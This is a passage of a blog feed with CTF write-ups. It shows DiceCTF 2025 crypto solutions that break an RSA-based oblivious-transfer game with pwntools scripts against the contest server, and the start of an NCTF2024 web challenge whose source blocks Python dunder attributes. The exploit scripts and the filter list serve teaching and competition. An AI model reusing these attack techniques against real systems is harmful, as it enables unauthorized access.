xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mo></mo><mi>d</mi><mo>=</mo><mi>k</mi><mo></mo><mi></mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">e*d=k*\phi(n) +1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal"></span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span></p><p><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mn>0</mn><mo>+</mo><mi>c</mi><mn>1</mn><mo></mo><mi>m</mi><mn>0</mn><mo>+</mo><mi>m</mi><mn>1</mn><mtext></mtext><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">c0+c1\equiv m0+m1\ mod(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">c</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">m</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">m</span><span class="mord">1</span><span class="mspace"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></p><p><code>m1</code><code>live</code><code>page</code><br /><code>input</code><strong></strong></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;dicec.tf&#x27;</span>, <span class="number">31001</span>)</span><br><span class="line"></span><br><span class="line">DEATH_CAUSES = [</span><br><span class="line">    <span class="string">&#x27;a fever&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;dysentery&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;measles&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;cholera&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;typhoid&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;exhaustion&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;a snakebite&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;a broken leg&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;a broken arm&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;drowning&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_value</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(p.recvline().strip().split(<span class="string">b&#x27;: &#x27;</span>)[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    p.recvline()</span><br><span class="line">    n = get_value()</span><br><span class="line">    e = get_value()</span><br><span class="line">    x0 = get_value()</span><br><span class="line">    x1 = get_value()</span><br><span class="line">    v = (x0 + x1) * inverse(<span class="number">2</span>, n) % n</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;v: &#x27;</span>, <span class="built_in">str</span>(v))</span><br><span class="line">    c0 = get_value()</span><br><span class="line">    c1 = get_value()</span><br><span class="line">    sum_m = (c0 + c1) % n</span><br><span class="line">    m1_prefix = <span class="string">b&#x27;you continue walking. turn to page &#x27;</span></span><br><span class="line">    <span class="keyword">for</span> <span class="keyword">case</span> <span class="keyword">in</span> DEATH_CAUSES:</span><br><span class="line">        m0 = bytes_to_long(<span class="string">f&#x27;you die of <span class="subst">&#123;<span class="keyword">case</span>&#125;</span>.&#x27;</span>.encode())</span><br><span class="line">        m1 = long_to_bytes((sum_m - m0) % n)</span><br><span class="line">        <span class="keyword">if</span> m1.startswith(m1_prefix):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                page = <span class="built_in">int</span>(m1[<span class="built_in">len</span>(m1_prefix):-<span class="number">1</span>])</span><br><span class="line">                p.sendlineafter(<span class="string">b&#x27;turn to page: &#x27;</span>, <span class="built_in">str</span>(page))</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">except</span> ValueError:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&quot;No valid page found&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvlines(<span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> trange(<span class="number">64</span>):</span><br><span class="line">    exp()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><code>you find a chest containing dice&#123;gl3am1ng_g0ld_doubl00n&#125;</code></p><p><strong></strong>tql</p><p><strong></strong></p><h2 id="winxy-pistol"><a class="markdownIt-Anchor" href="#winxy-pistol"></a> winxy-pistol</h2><blockquote><p>Choose your own adventure!</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/local/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor</span><br><span class="line"></span><br><span class="line">DEATH_CAUSES = [</span><br><span class="line"><span class="string">&#x27;a fever&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;dysentery&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;measles&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;cholera&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;typhoid&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;exhaustion&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;a snakebite&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;a broken leg&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;a broken arm&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;drowning&#x27;</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">k, msg</span>):</span><br><span class="line">key = k.to_bytes(<span class="number">1024</span>//<span class="number">8</span>, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">msg = msg.encode().ljust(<span class="number">64</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">pad = hashlib.shake_256(key).digest(<span class="built_in">len</span>(msg))</span><br><span class="line"><span class="keyword">return</span> strxor(pad, msg)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_ot</span>(<span class="params">key, msg0, msg1</span>):</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">https://en.wikipedia.org/wiki/Oblivious_transfer#12_oblivious_transfer</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">x0 = secrets.randbelow(key.n)</span><br><span class="line">x1 = secrets.randbelow(key.n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n: <span class="subst">&#123;key.n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;e: <span class="subst">&#123;key.e&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;x0: <span class="subst">&#123;x0&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;x1: <span class="subst">&#123;x1&#125;</span>&#x27;</span>)</span><br><span class="line">v = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;v: &#x27;</span>))</span><br><span class="line"><span class="keyword">assert</span> <span class="number">0</span> &lt;= v &lt; key.n, <span class="string">&#x27;invalid value&#x27;</span></span><br><span class="line">k0 = <span class="built_in">pow</span>(v - x0, key.d, key.n)</span><br><span class="line">k1 = <span class="built_in">pow</span>(v - x1, key.d, key.n)</span><br><span class="line">c0 = encrypt(k0, msg0)</span><br><span class="line">c1 = encrypt(k1, msg1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c0: <span class="subst">&#123;c0.<span class="built_in">hex</span>()&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c1: <span class="subst">&#123;c1.<span class="built_in">hex</span>()&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">flag = f.read().strip()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;key.pem&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">key = RSA.import_key(f.read())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;=== CHOOSE YOUR OWN ADVENTURE: Winxy Pistol Edition ===&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;you enter a cave.&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;the tunnel forks ahead. do you take the left or right path?&#x27;</span>)</span><br><span class="line">msgs = [<span class="literal">None</span>, <span class="literal">None</span>]</span><br><span class="line">page = secrets.randbits(<span class="number">32</span>)</span><br><span class="line">live = <span class="string">f&#x27;you continue walking. turn to page <span class="subst">&#123;page&#125;</span>.&#x27;</span></span><br><span class="line">die = <span class="string">f&#x27;you die of <span class="subst">&#123;secrets.choice(DEATH_CAUSES)&#125;</span>.&#x27;</span></span><br><span class="line">msgs = (live, die) <span class="keyword">if</span> secrets.randbits(<span class="number">1</span>) <span class="keyword">else</span> (die, live)</span><br><span class="line">run_ot(key, *msgs)</span><br><span class="line">page_guess = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;turn to page: &#x27;</span>))</span><br><span class="line"><span class="keyword">if</span> page_guess != page:</span><br><span class="line">exit()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;you find a chest containing <span class="subst">&#123;flag&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><p></p><p><code>c0,c1</code><code>shake_256(key)</code><strong>rsa</strong></p><p><a href="https://blog.maple3142.net/2025/03/31/dicectf-2025-quals-writeups/#winxy-pistol">maple3142wp</a></p><p><code>v = x0</code><code>k0 = 0</code><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mn>1</mn><mo></mo><mo stretchy="false">(</mo><mi>v</mi><mo></mo><mi>x</mi><mn>1</mn><msup><mo stretchy="false">)</mo><mi>d</mi></msup><mi>m</mi><mi>o</mi><mi>d</mi><mtext></mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">k1\equiv(v-x1)^{d}mod\ n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.099108em;vertical-align:-0.25em;"></span><span class="mord mathnormal">x</span><span class="mord">1</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">d</span></span></span></span></span></span></span></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"></span><span class="mord mathnormal">n</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><msup><mn>0</mn><mo mathvariant="normal" lspace="0em" rspace="0em"></mo></msup><mo></mo><mo stretchy="false">(</mo><msup><mi>v</mi><mo mathvariant="normal" lspace="0em" rspace="0em"></mo></msup><mo></mo><mi>x</mi><msup><mn>0</mn><mo mathvariant="normal" lspace="0em" rspace="0em"></mo></msup><msup><mo stretchy="false">)</mo><mi>d</mi></msup><mo></mo><mo stretchy="false">(</mo><mi>v</mi><mo></mo><mi>x</mi><mn>1</mn><msup><mo stretchy="false">)</mo><mi>d</mi></msup><mi>m</mi><mi>o</mi><mi>d</mi><mtext></mtext><mi>n</mi><mo></mo><mi>k</mi><mn>1</mn></mrow><annotation encoding="application/x-tex">k0&#x27;\equiv(v&#x27;-x0&#x27;)^{d}\equiv(v-x1)^{d}mod\ n\equiv k1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.751892em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.099108em;vertical-align:-0.25em;"></span><span class="mord mathnormal">x</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"></span></span></span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">d</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.099108em;vertical-align:-0.25em;"></span><span class="mord mathnormal">x</span><span class="mord">1</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">d</span></span></span></span></span></span></span></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord">1</span></span></span></span></p><p><code>v' = v + x0' - x1</code></p><p><code>m0 = die</code><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><msup><mn>0</mn><mo mathvariant="normal" lspace="0em" rspace="0em"></mo></msup><mo></mo><mi>c</mi><mn>1</mn><mo>=</mo><mi>m</mi><msup><mn>0</mn><mo mathvariant="normal" lspace="0em" rspace="0em"></mo></msup><mo></mo><mi>m</mi><mn>1</mn></mrow><annotation encoding="application/x-tex">c0&#x27;\oplus c1=m0&#x27;\oplus m1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.835222em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">c</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.835222em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">m</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord mathnormal">m</span><span class="mord">1</span></span></span></span></p><p><code>m1</code><code>page</code><code>m0' = die</code><code>die</code><strong></strong><code>page</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> context, remote</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">k, ct</span>):</span><br><span class="line">    key = k.to_bytes(<span class="number">1024</span> // <span class="number">8</span>, <span class="string">&quot;big&quot;</span>)</span><br><span class="line">    pad = hashlib.shake_256(key).digest(<span class="built_in">len</span>(ct))</span><br><span class="line">    <span class="keyword">return</span> strxor(pad, ct)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">connect</span>():</span><br><span class="line">    io = remote(<span class="string">&quot;dicec.tf&quot;</span>, <span class="number">31002</span>)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recv</span>(<span class="params">io</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;n: &quot;</span>)</span><br><span class="line">    n = <span class="built_in">int</span>(io.recvline().strip())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;e: &quot;</span>)</span><br><span class="line">    e = <span class="built_in">int</span>(io.recvline().strip())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;x0: &quot;</span>)</span><br><span class="line">    x0 = <span class="built_in">int</span>(io.recvline().strip())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;x1: &quot;</span>)</span><br><span class="line">    x1 = <span class="built_in">int</span>(io.recvline().strip())</span><br><span class="line">    <span class="keyword">return</span> n, e, x0, x1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ot</span>(<span class="params">io, v</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;v: &quot;</span>, <span class="built_in">str</span>(v).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;c0: &quot;</span>)</span><br><span class="line">    c0 = <span class="built_in">bytes</span>.fromhex(io.recvlineS().strip())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;c1: &quot;</span>)</span><br><span class="line">    c1 = <span class="built_in">bytes</span>.fromhex(io.recvlineS().strip())</span><br><span class="line">    <span class="keyword">return</span> c0, c1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PAGE_RE = re.<span class="built_in">compile</span>(<span class="string">rb&quot;page (\d+)&quot;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;error&quot;</span></span><br><span class="line">io = connect()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> trange(<span class="number">64</span>):</span><br><span class="line">    n, e, x0, x1 = recv(io)</span><br><span class="line">    v = x0</span><br><span class="line">    c0, c1 = ot(io, v)</span><br><span class="line">    k0 = <span class="number">0</span></span><br><span class="line">    m0 = decrypt(k0, c0)</span><br><span class="line">    <span class="keyword">if</span> m0.startswith(<span class="string">b&quot;you die of &quot;</span>):</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            io2 = connect()</span><br><span class="line">            _, _, x0p, _ = recv(io2)</span><br><span class="line">            vp = (v - x1 + x0p) % n</span><br><span class="line">            c0p, _ = ot(io2, vp)</span><br><span class="line">            io2.close()</span><br><span class="line">            m1xorm0p = strxor(c0p, c1)</span><br><span class="line">            <span class="comment"># we hope m0&#x27; is short (death), so the page part will not be xored</span></span><br><span class="line">            <span class="comment"># probability: 1/2</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&quot;page&quot;</span> <span class="keyword">in</span> m1xorm0p:</span><br><span class="line">                page = <span class="built_in">int</span>(PAGE_RE.search(m1xorm0p).group(<span class="number">1</span>))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        page = <span class="built_in">int</span>(PAGE_RE.search(m0).group(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;page: &quot;</span>, <span class="built_in">str</span>(page).encode())</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><code>you find a chest containing dice&#123;lu5tr0us_j3wel_tr1nk3t&#125;</code></p><p><code>exp</code><br /><img src="https://pica.zhimg.com/80/v2-0d370d7d3fdca18e533722ee59a2fe0a_1440w.png" alt="" /></p><h2 id="satisfiedunsolved"><a class="markdownIt-Anchor" href="#satisfiedunsolved"></a> satisfied(unsolved)</h2><blockquote><p>you dont even know what youre asking me to confess</p></blockquote><p><strong>cryptohackZKP</strong></p><h1 id=""><a class="markdownIt-Anchor" href="#"></a> </h1><p><a href="https://blog.maple3142.net/2025/03/31/dicectf-2025-quals-writeups/">wp</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;web&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#web&quot;&gt;&lt;/a&gt; Web&lt;/h1&gt;
&lt;h2 id=&quot;cookie-recipes-v3&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#cookie-re</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>NCTF2024-WriteUp</title>
    <link href="https://hvang10.github.io/2025/03/23/NCTF2024-WriteUp/"/>
    <id>https://hvang10.github.io/2025/03/23/NCTF2024-WriteUp/</id>
    <published>2025-03-22T16:43:10.000Z</published>
    <updated>2025-03-28T02:59:28.386Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://o1r4dlnbgzn.feishu.cn/docx/JtOBd2LZXocQQmxz099cuUTLnLh">laogongwp</a></p><h1 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h1><h2 id="ez_dash-ez_dash-revenge"><a class="markdownIt-Anchor" href="#ez_dash-ez_dash-revenge"></a> ez_dash &amp;&amp; ez_dash revenge</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Hints: Flag</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Optional</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"><span class="keyword">import</span> bottle</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__forbidden_path__=[<span class="string">&#x27;__annotations__&#x27;</span>, <span class="string">&#x27;__call__&#x27;</span>, <span class="string">&#x27;__class__&#x27;</span>, <span class="string">&#x27;__closure__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__code__&#x27;</span>, <span class="string">&#x27;__defaults__&#x27;</span>, <span class="string">&#x27;__delattr__&#x27;</span>, <span class="string">&#x27;__dict__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__dir__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__eq__&#x27;</span>, <span class="string">&#x27;__format__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__ge__&#x27;</span>, <span class="string">&#x27;__get__&#x27;</span>, <span class="string">&#x27;__getattribute__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__gt__&#x27;</span>, <span class="string">&#x27;__hash__&#x27;</span>, <span class="string">&#x27;__init__&#x27;</span>, <span class="string">&#x27;__init_subclass__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__kwdefaults__&#x27;</span>, <span class="string">&#x27;__le__&#x27;</span>, <span class="string">&#x27;__lt__&#x27;</span>, <span class="string">&#x27;__module__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__ne__&#x27;</span>, <span class="string">&#x27;__new__&#x27;</span>, <span class="string">&#x27;__qualname__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__reduce__&#x27;</span>, <span class="string">&#x27;__reduce_ex__&#x27;</span>, <span class="string">&#x27;__repr__&#x27;</span>, <span class="string">&#x27;__setattr__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__sizeof__&#x27;</span>, <span class="string">&#x27;__str__&#x27;</span>, <span class="string">&#x27;__subclasshook__&#x27;</span>, <span class="string">&#x27;__wrapped__&#x27;</span>,</span><br><span class="line">               <span class="string">&quot;Optional&quot;</span>,<span class="string">&quot;func&quot;</span>,<span class="string">&quot;render&quot;</span>,</span><br><span class="line">               